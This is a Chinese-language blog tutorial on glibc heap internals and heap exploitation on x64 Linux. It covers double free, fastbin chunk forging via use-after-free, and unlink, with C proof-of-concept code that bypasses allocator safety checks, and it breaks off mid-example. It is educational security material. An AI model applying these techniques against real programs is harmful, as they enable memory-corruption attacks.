<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns#">
<head>
  <meta charset="UTF-8" />
  <title>How2heap | A-NOTES</title>
  <link rel="stylesheet" href="https://alset0326.github.io/extra/normalize.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700,700i%7CSource+Code+Pro:400,400i,600" />
  <link rel="stylesheet" href="https://alset0326.github.io/static/m-light.compiled.css" />
  <link rel="stylesheet" href="https://alset0326.github.io/extra/highlight.css" />
  <link rel="icon" href="https://alset0326.github.io/images/logo.jpeg" type="image/jpeg" />
  <link rel="canonical" href="https://alset0326.github.io/how2heap.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#cb4b16" />
  <meta property="og:site_name" content="A-NOTES" />
  <meta property="og:title" content="How2heap" />
  <meta name="twitter:title" content="How2heap" />
  <meta property="og:url" content="https://alset0326.github.io/how2heap.html" />
  <meta property="og:description" content="How to exploit heap on linux x64" />
  <meta name="twitter:description" content="How to exploit heap on linux x64" />
  <meta name="twitter:card" content="summary" />
  <meta property="og:type" content="article" />
</head>
<body>
<header><nav id="navigation">
  <div class="m-container">
    <div class="m-row">
      <a href="https://alset0326.github.io/" id="m-navbar-brand" class="m-col-t-9 m-col-m-none m-left-m">A-NOTE To Remind Something</a>
      <a id="m-navbar-show" href="#navigation" title="Show navigation" class="m-col-t-3 m-hide-m m-text-right"></a>
      <a id="m-navbar-hide" href="#" title="Hide navigation" class="m-col-t-3 m-hide-m m-text-right"></a>
      <div id="m-navbar-collapse" class="m-col-t-12 m-show-m m-col-m-none m-right-m">
        <div class="m-row">
          <ol class="m-col-t-6 m-col-m-none">
            <li><a href="https://alset0326.github.io/">HOME</a></li>
          </ol>
          <ol class="m-col-t-6 m-col-m-none" start="2">
            <li><a href="https://github.com/alset0326">GITHUB</a></li>
          </ol>
        </div>
      </div>
    </div>
  </div>
</nav></header>
<main>
<div class="m-container">
  <div class="m-row">
    <article class="m-col-m-10 m-nopadb">
      <header>
        <h1><a href="https://alset0326.github.io/how2heap.html" rel="bookmark" title="Permalink to How2heap">
          <time class="m-date" datetime="2018-03-26T21:31:10.349398+08:00">
            3 <span class="m-date-day">26</span> 2018
          </time>
          How2heap
        </a></h1>
        <p>How to exploit heap on linux x64</p>
      </header>
      <div class="m-clearfix-l"></div>
<!-- content -->
<div class="toc">
<ul>
<li><a href="#0">0. 基础</a><ul>
<li><a href="#0-malloc_chunk">0. malloc_chunk</a></li>
<li><a href="#1-allocated-chunk">1. Allocated chunk</a></li>
<li><a href="#2-free-chunk">2. Free chunk</a></li>
<li><a href="#3">3. 标志位</a></li>
<li><a href="#4-bins-and-chunks">4. Bins and Chunks</a><ul>
<li><a href="#0-fast-bins">0. Fast bins</a></li>
<li><a href="#1-small-bins">1. Small bins</a></li>
<li><a href="#2-large-bins">2. Large bins</a></li>
<li><a href="#3-unsorted-bin">3. Unsorted bin</a></li>
<li><a href="#4-top-chunk">4. Top chunk</a></li>
<li><a href="#5-last-remainder-chunk">5. Last remainder chunk</a></li>
</ul>
</li>
<li><a href="#5-malloc">5. Malloc核心步骤</a></li>
</ul>
</li>
<li><a href="#1-exploit">1. Exploit</a><ul>
<li><a href="#0-double-free">0. Double Free</a></li>
<li><a href="#1-forging-chunks-uaf-on-fastbin">1. Forging chunks / UAF on fastbin</a></li>
<li><a href="#2-unlink-exploit">2. Unlink Exploit</a></li>
<li><a href="#30-poison_null_byte-shrinking-free-chunks-freechunksize">3.0 poison_null_byte / Shrinking Free Chunks / 减少free的chunk的size</a></li>
<li><a href="#31-overlapping-chunks-increasing-used-chunks-chunk">3.1 Overlapping Chunks / Increasing used Chunks / 增加在使用的chunk的大小</a></li>
<li><a href="#32-overlapping-chunks-increase-free-chunks-free-chunk">3.2 Overlapping Chunks / Increase free chunks / 增加free chunk大小</a></li>
<li><a href="#4-house-of-spirit-freechunk">4. House of Spirit / Free虚假的chunk</a></li>
<li><a href="#5-house-of-lore-uaf-on-smallbin">5. House of Lore / UAF on smallbin</a></li>
<li><a href="#6-house-of-force-increase-top-chunk-size">6. House of Force / Increase top chunk size</a></li>
<li><a href="#7-house-of-einherjar-rewrite-prev_size-and-p">7. House of Einherjar / rewrite prev_size and P</a></li>
<li><a href="#8-aslr-aslr">8. ASLR绕过 / ASLR低位覆盖</a></li>
<li><a href="#9-unsorted-bin-attack">9. Unsorted Bin Attack</a></li>
<li><a href="#10house-of-orange-top-chunk">10.House of orange / 减少Top chunk大小</a></li>
</ul>
</li>
</ul>
</div>
<h1 id="0">0. 基础</h1>
<p>X64系统下的glibc heap基础，对齐为0x10字节，指针长度为8字节</p>
<h2 id="0-malloc_chunk">0. malloc_chunk</h2>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>                <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
  <span class="cm">/* Only used for large blocks: pointer to next larger size.  */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd_nextsize</span><span class="p">;</span> <span class="cm">/* double links -- used only if free. */</span>
  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk_nextsize</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">mchunkptr</span><span class="p">;</span>
</pre></div>

<h2 id="1-allocated-chunk">1. Allocated chunk</h2>
<div class="highlight"><pre><span></span>   chunk1-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk1, in bytes                    |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
   chunk2-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |    (size of chunk1, but used for chunk1&#39;s application data)   |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |              Size of chunk2, in bytes                   |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</pre></div>

<p>此时chunk2的前8字节都是chunk1的数据</p>
<h2 id="2-free-chunk">2. Free chunk</h2>
<div class="highlight"><pre><span></span>   chunk1-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:&#39; |             Size of chunk1, in bytes                    |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
   chunk2-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:&#39; |             Size of chunk1, in bytes                          |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk2, in bytes                    |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</pre></div>

<h2 id="3">3. 标志位</h2>
<p><strong>P (PREV_INUSE)</strong>: 0表示（内存地址上相邻的）前一个chunk是free的状态，此时该chunk的前8字节保存的是前一个free的chunk的大小。如果是1，则该chunk的前8个字节是前一个chunk的数据。</p>
<p><strong>M (IS_MMAPPED)</strong>: 这个chunk是mmap出来的，此时其他两个bit会被忽略</p>
<p><strong>A (NON_MAIN_ARENA)</strong>: 0表示这个chunk是在main arena上分配的，新线程会生成新的arena，这个bit会设为1</p>
<h2 id="4-bins-and-chunks">4. Bins and Chunks</h2>
<p>一个bin指的是一个双向或者单向链表，用来存储free的chunk。bin根据其存储的chunk的大小分为以下几类，每一类使用数组存储多个bin，该数组称为bins：</p>
<ol>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ol>
<p>Fast bins的定义是</p>
<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="o">*</span><span class="n">mfastbinptr</span><span class="p">;</span>

<span class="n">mfastbinptr</span> <span class="n">fastbinsY</span><span class="p">[</span><span class="n">NFASTBINS</span><span class="p">];</span> <span class="c1">// Array of pointers to chunks</span>
</pre></div>

<p>Unsorted, small 和 large bins 存储在同一个数组中</p>
<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">mchunkptr</span><span class="p">;</span>
<span class="cp">#define NBINS             128</span>
<span class="n">mchunkptr</span> <span class="n">bins</span><span class="p">[</span><span class="n">NBINS</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span> <span class="c1">// Array of pointers to chunks</span>
</pre></div>

<p>在检索的时候，libc设定最开始的bin为<code>bin_at(1)</code>，也就是检索是从1开始，不存在<code>bin_at(0)</code>，此举是为了加速。bin1存储的是<code>unsorted bin</code>。</p>
<p>每一个bin保存了两个属性在bins中，分别是bin链表的头指针和尾指针。如果是fast bins，则是单链表，尾指针为空。</p>
<h3 id="0-fast-bins">0. Fast bins</h3>
<p>Fast bin有10个，每一个 fast bin 维护一个单向链表，插入和删除都在链表头部，使用后进先出（LIFO）的规则。</p>
<p>每一个bin所保存的chunk都有相同的大小（size），分别是0x20、0x30、0x40……0xb0，最小0x20、最大0xb0</p>
<p>malloc的时候，malloc会根据会参数计算所需申请的chunk大小，计算的公式是malloc的size加8然后向上对齐于0x10</p>
<div class="highlight"><pre><span></span><span class="n">chunk_size</span> <span class="o">=</span> <span class="p">((</span><span class="n">malloc_size</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xf</span><span class="p">)</span>
</pre></div>

<p>但是，fastbin并不会使用全部的fastbin，而是存在一个全局变量<code>global_max_fast</code>，这个变量指明了使用fastbin的chunk的最大值，这个值在64位系统上是<code>0x80</code>，也就是说只有chunk大小小于等于0x80的时候，free时才会存储到fastbin中，否则会存储到smallbin中，该全局变量可以被<code>__libc_mallopt</code>函数修改。该变量默认值为：</p>
<div class="highlight"><pre><span></span><span class="cp">#ifndef DEFAULT_MXFAST</span>
<span class="cp">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span>
<span class="cp">#endif</span>
<span class="n">malloc_init_state</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">//...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
    <span class="n">set_max_fast</span> <span class="p">(</span><span class="n">DEFAULT_MXFAST</span><span class="p">);</span>
  <span class="c1">//...</span>
<span class="p">}</span>
</pre></div>

<h3 id="1-small-bins">1. Small bins</h3>
<p>Small bin有62个，每一个small bin都是一个双向链表，插入发生在链表头部、删除发生在链表尾部，使用先进先出（FIFO）的规则。</p>
<p>每一个bin所保存的chunk都有相同的大小，分别是0x20、0x30、0x40……0x3f0，最小0x20、最大0x3f0</p>
<p>至于为什么smallbin会包含fastbin的大小，那是因为在<code>malloc_consolidate</code>操作之后，fastbin的空间会被回收，而单独的不能合并的chunk就会保存到smallbin中。</p>
<h3 id="2-large-bins">2. Large bins</h3>
<p>Large bin有63个，每一个 large bin都是一个双向链表，每一个large bin都含有不同大小的chunk，一个链表中的各个chunk按照大小降序排列，最大的chunk在链表头、最小的chunk在链表尾，插入和删除操作可能发生在任意位置。</p>
<p>默认chunk大小大于1024的为largechunk，libc的注释有很重大的问题，下面是修正</p>
<div class="highlight"><pre><span></span><span class="cm">/*</span>
<span class="cm">    No. of Bins       Spacing between bins      Bin index start        Min size</span>
<span class="cm">    33 bins of size      64                            64                1024</span>
<span class="cm">    15 bins of size     512                            97                3136</span>
<span class="cm">     8 bins of size    4096                            112               10752</span>
<span class="cm">     1 bins of size    4096/32768                      120               40960</span>
<span class="cm">     3 bins of size   32768                            121               65536</span>
<span class="cm">     2 bins of size  262144                            124               163840</span>
<span class="cm">     1 bin  of size what&#39;s left                        126               524288</span>
<span class="cm"> */</span>
<span class="c1">// XXX It remains to be seen whether it is good to keep the widths of</span>
<span class="c1">// XXX the buckets the same or whether it should be scaled by a factor</span>
<span class="c1">// XXX of two as well.</span>
<span class="cp">#define largebin_index_64(sz)                                                \</span>
<span class="cp">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\</span>
<span class="cp">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</span>
<span class="cp">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</span>
<span class="cp">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</span>
<span class="cp">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</span>
<span class="cp">   126)</span>
</pre></div>

<h3 id="3-unsorted-bin">3. Unsorted bin</h3>
<p>只有一个Unsorted bin，当 small bin 和 large bin 释放的时候，会暂存在这里。这个bin主要是起到一个缓存的作用。</p>
<p>当small bin和large bin从unsorted bin中回收的时候，可能会发生chunk的合并操作。</p>
<p>unsorted bin 的队列使用 bins 数组的第一个，如果被用户释放的 chunk 大于 max_fast，或者 fast bins 中的空闲 chunk 合并后，这些 chunk 首先会被放到 unsorted bin 队列中。在进 行 malloc 操作的时候，如果在 fast bins 中没有找到合适的 chunk，则 ptmalloc 会先在 unsorted bin 中查找合适的空闲 chunk，然后才查找 bins。
如果 unsorted bin 不能满足分配要求。malloc 便会将 unsorted bin 中的 chunk 加入 bins 中。然后再从 bins 中继续进行查找和分配过程。</p>
<p>从这个过程可以看出来，unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</p>
<h3 id="4-top-chunk">4. Top chunk</h3>
<p>这是一个特殊的chunk，用于指向arena中从未被申请的空间，位于整个arena的末尾。</p>
<p>如果他的空间不足时，malloc会使用<code>sbrk</code>系统调用增加arena的空间。</p>
<p>该chunk的<code>P</code>位标记永远会被设置。</p>
<h3 id="5-last-remainder-chunk">5. Last remainder chunk</h3>
<p>用于暂存分割大chunk生成的两个小chunk中未被使用的那一个。</p>
<h2 id="5-malloc">5. Malloc核心步骤</h2>
<p><img alt="malloc" src="../images/heap.png" /></p>
<h1 id="1-exploit">1. Exploit</h1>
<h2 id="0-double-free">0. Double Free</h2>
<p>对fastbin执行free的时候，会检查当前fastbin头部的chunk与待free的chunk是否是同一个，因此需要在两次次free中间插入其他相同大小的chunk的free</p>
<ul>
<li>适用条件<ul>
<li>能够Double Free</li>
</ul>
</li>
</ul>
<ul>
<li>安全检查<ul>
<li>fastbin的头部chunk与待free的chunk不是同一个</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04010</span>
<span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04030</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04050</span>

<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
<span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>  <span class="c1">// To bypass &quot;double free or corruption (fasttop)&quot; check</span>
<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>  <span class="c1">// Double Free !!</span>

<span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04010</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04030</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>     <span class="c1">// 0xa04010   - Same as &#39;d&#39; !</span>
</pre></div>

<p>注意，上述代码的方法不适合smallbin，因为smallbin会检查下一个chunk的P位有没有被设置，而如果我们没有修改P位，则freebuild报错“double free or corruption (!prev)”</p>
<p>此外，可以通过在两次free中间申请largechunk（&gt;=1024），使得第一次被free的fastbin进入unsorted bin再进入smallbin，这样第二次free的时候也可以绕过fastbin的头部检查。代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocated two fastbins: p1=%p p2=%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now free p1!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>

  <span class="kt">void</span><span class="o">*</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p3</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;In process unsorted bin, p1 is moved to the smallbin.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Trigger the double free vulnerability!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We can pass the check in malloc() since p1 is not fast top.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now p1 is in small bin and fast bin. So we&#39;will get it twice: %p %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">),</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>

<h2 id="1-forging-chunks-uaf-on-fastbin">1. Forging chunks / UAF on fastbin</h2>
<p>chunk被free掉之后，如果有UAF漏洞，那么可以修改被free的chunk的fd或者bd指针，指向假的chunk，使得随后的第二次malloc会获得我们的假的chunk</p>
<ul>
<li>条件<ul>
<li>UAF</li>
</ul>
</li>
</ul>
<ul>
<li>安全检查<ul>
<li>假的chunk的大小需要与free的chunk相同</li>
</ul>
</li>
</ul>
<p>一个fastbin的UAF利用如下</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">forged_chunk</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">forged_chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">forged_chunk</span> <span class="o">*</span><span class="n">bck</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>               <span class="c1">// padding</span>
<span class="p">};</span>

<span class="c1">// First grab a fast chunk</span>
<span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>               <span class="c1">// &#39;a&#39; points to 0x219c010</span>

<span class="c1">// Create a forged chunk</span>
<span class="k">struct</span> <span class="n">forged_chunk</span> <span class="n">chunk</span><span class="p">;</span>    <span class="c1">// At address 0x7ffc6de96690</span>
<span class="n">chunk</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>            <span class="c1">// This size should fall in the same fastbin</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">chunk</span><span class="p">.</span><span class="n">fd</span><span class="p">;</span>     <span class="c1">// Data starts here for an allocated chunk</span>
<span class="n">strcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">&quot;attacker&#39;s data&quot;</span><span class="p">);</span>

<span class="c1">// Put the fast chunk back into fastbin</span>
<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
<span class="c1">// Modify &#39;fd&#39; pointer of &#39;a&#39; to point to our forged chunk</span>
<span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">chunk</span><span class="p">;</span>
<span class="c1">// Remove &#39;a&#39; from HEAD of fastbin</span>
<span class="c1">// Our forged chunk will now be at the HEAD of fastbin</span>
<span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>                   <span class="c1">// Will return 0x219c010</span>

<span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>          <span class="c1">// Points to 0x7ffc6de966a0</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>       <span class="c1">// Prints &quot;attacker&#39;s data&quot; !!</span>
</pre></div>

<h2 id="2-unlink-exploit">2. Unlink Exploit</h2>
<p>unlink指的是将chunk从bin的链表中间的某个位置取出的操作，在unlink的过程中会对被取出chunk的前后chunk的fd和bd进行重置。</p>
<ul>
<li>条件<ul>
<li>存在内存上连续的两个chunk，前一个chunk能够溢出修改后一个chunk的P位和prev_size</li>
<li>上述两个chunk大小属于fastbin</li>
</ul>
</li>
</ul>
<ul>
<li>安全检查<ul>
<li>假的chunk确保<code>P-&gt;fd-&gt;bk == P</code>和<code>P-&gt;bk-&gt;fd == P</code></li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>               <span class="c1">// padding</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span> <span class="o">*</span><span class="n">chunk2</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fake_chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">chunk2_hdr</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

  <span class="c1">// First grab two chunks (non fast)</span>
  <span class="n">chunk1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
  <span class="n">chunk2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">chunk1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">chunk2</span><span class="p">);</span>

  <span class="c1">// Assuming attacker has control over chunk1&#39;s contents</span>
  <span class="c1">// Overflow the heap, override chunk2&#39;s header</span>

  <span class="c1">// First forge a fake chunk starting at chunk1</span>
  <span class="c1">// Need to setup fd and bk pointers to pass the unlink security check</span>
  <span class="n">fake_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk1</span><span class="p">;</span>
  <span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">chunk1</span> <span class="o">-</span> <span class="mi">3</span><span class="p">);</span> <span class="c1">// Ensures P-&gt;fd-&gt;bk == P</span>
  <span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">chunk1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// Ensures P-&gt;bk-&gt;fd == P</span>

  <span class="c1">// Next modify the header of chunk2 to pass all security checks</span>
  <span class="n">chunk2_hdr</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">chunk2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
